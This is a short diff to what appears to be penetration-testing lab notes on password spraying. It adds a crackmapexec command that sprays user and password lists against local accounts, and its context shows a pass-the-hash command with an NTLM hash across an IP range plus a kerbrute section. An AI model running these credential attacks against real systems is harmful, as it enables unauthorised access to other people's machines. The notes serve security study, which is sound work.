@@ -297,6 +297,10 @@ crackmapexec added `Pwn3d!` to the output, indicating that the user has administ
 ```
 crackmapexec smb 192.168.248.70-76 -u jeffadmin -H e460605a9dbd55097c6cf77af2f89a03 -d corp.com --continue-on-success
 ```
+- Local Users:
+```
+crackmapexec smb 10.10.101.154 -u users.txt -p passwords.txt --local-auth --continue-on-success
+```
 ## `kerbrute`
 - Password spraying using Kerberos TGT
 We'll need to provide a username and password to do this. If the credentials are valid, we'll obtain a TGT.
